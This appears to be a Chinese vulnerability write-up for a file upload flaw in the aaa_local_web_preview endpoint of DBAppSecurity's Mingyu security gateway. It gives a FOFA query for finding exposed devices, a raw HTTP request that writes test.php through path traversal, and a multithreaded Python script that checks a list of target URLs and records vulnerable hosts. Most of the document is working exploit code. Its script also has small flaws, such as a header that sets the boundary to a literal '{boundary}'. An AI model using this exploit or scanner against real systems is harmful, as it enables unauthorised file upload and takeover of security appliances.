# 安恒明御安全网关aaa_local_web_preview文件上传漏洞

### 漏洞描述

安恒明御安全网关是一个网络安全产品，由安恒信息技术股份有限公司开发和提供。它是一个综合性的安全管理平台，用于保护企业网络免受各种网络威胁的攻击。该产品aaa_local_web_preview端点存在文件上传漏洞。

### fofa语法

```
title=="明御安全网关"
```

### 漏洞复现

```
POST /webui/?g=aaa_local_web_preview&name=123&read=0&suffix=/../../../test.php HTTP/1.1
Host: 127.0.0.1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
Content-Type: multipart/form-data; boundary=849978f98abe41119122148e4aa65b1a
Accept-Encoding: gzip
Content-Length: 196

--849978f98abe41119122148e4aa65b1a
Content-Disposition: form-data; name="123"; filename="test.php"
Content-Type: text/plain

This page has a vulnerability
--849978f98abe41119122148e4aa65b1a--
```

![image.png](https://cdn.nlark.com/yuque/0/2024/png/42783549/1719831199502-aa3aee91-716a-417e-9c21-deee55efd91c.png?x-oss-process=image%2Fformat%2Cwebp%2Fresize%2Cw_937%2Climit_0)

浏览器拼接路径访问

![image.png](https://cdn.nlark.com/yuque/0/2024/png/42783549/1719831251380-1333e188-541f-475d-9d69-77de38a79222.png?x-oss-process=image%2Fformat%2Cwebp)

### poc脚本

~~~markdown
import sys,requests,time,argparse
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()

def banner():
    test = """
██╗  ██╗ █████╗  ██████╗██╗  ██╗    ██████╗ ██╗   ██╗    ███╗   ███╗ █████╗ ███████╗██╗  ██╗ █████╗ 
██║  ██║██╔══██╗██╔════╝██║ ██╔╝    ██╔══██╗╚██╗ ██╔╝    ████╗ ████║██╔══██╗╚══███╔╝██║  ██║██╔══██╗
███████║███████║██║     █████╔╝     ██████╔╝ ╚████╔╝     ██╔████╔██║███████║  ███╔╝ ███████║███████║
██╔══██║██╔══██║██║     ██╔═██╗     ██╔══██╗  ╚██╔╝      ██║╚██╔╝██║██╔══██║ ███╔╝  ██╔══██║██╔══██║
██║  ██║██║  ██║╚██████╗██║  ██╗    ██████╔╝   ██║       ██║ ╚═╝ ██║██║  ██║███████╗██║  ██║██║  ██║
╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝    ╚═════╝    ╚═╝       ╚═╝     ╚═╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝ 
                                version:1.1.0              
                                author:mazha.top
"""
    print(test)

def main():
    banner()
    parser = argparse.ArgumentParser(description='安恒明御安全网关 文件上传')
    parser.add_argument('-u','--url',dest='url',type=str,help='Please input link')
    parser.add_argument('-f','--file',dest='file',type=str,help='File Path')
    args = parser.parse_args()

    if args.url and not args.file:
        poc(args.url)
    elif not args.url and args.file:
        url_list = []
        with open(args.file,'r',encoding='utf-8') as fp:
            for url in fp.readlines():
                url_list.append(url.strip().replace('\n',''))
        mp = Pool(100)
        mp.map(poc,url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usage:\n\t python3 {sys.argv[0]} -h")

def poc(target,boundary="--849978f98abe41119122148e4aa65b1a"):
    payload_url = '/webui/?g=aaa_local_web_preview&name=123&read=0&suffix=/../../../test.php'
    url = target + payload_url
    headers = {
        'User-Agent':'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15',
        'Content-Type':'multipart/form-data; boundary={boundary}',
        'Accept-Encoding':'gzip',
        'Content-Length':'200',
    }
    data = {
        '123': ('test.php', '<?php print("This page has a vulnerability"); ?>', 'text/plain')
    }

    try:
        res = requests.post(url=url, headers=headers, data=data, timeout=5,verify=False)
        # print(res.status_code)
        if "success" in res.text:
            payload = '/test.php'
            url1 = target +  payload
            res1 = requests.get(url=url1,verify=False)
            if "This page has a vulnerability" in res1.text:
                print(f"[+]该网站存在文件上传漏洞,url为 {target}")
                with open("result.txt", "a", encoding="utf-8") as fp:
                    fp.write(target + '\n')
        else:
            print(f"[-]该网站不存在文件上传漏洞,url为 {target}")

    except Exception as e:
        print(f"[*]该网站无法访问,url为: {target}")

if __name__ == '__main__':
    main()
~~~

### py脚本使用

```
python3 360 脚本文件名 -u "http://127.0.0.1"  # 测试单个url
python3 360 脚本文件名 -f url.txt             # 测试多个url
```

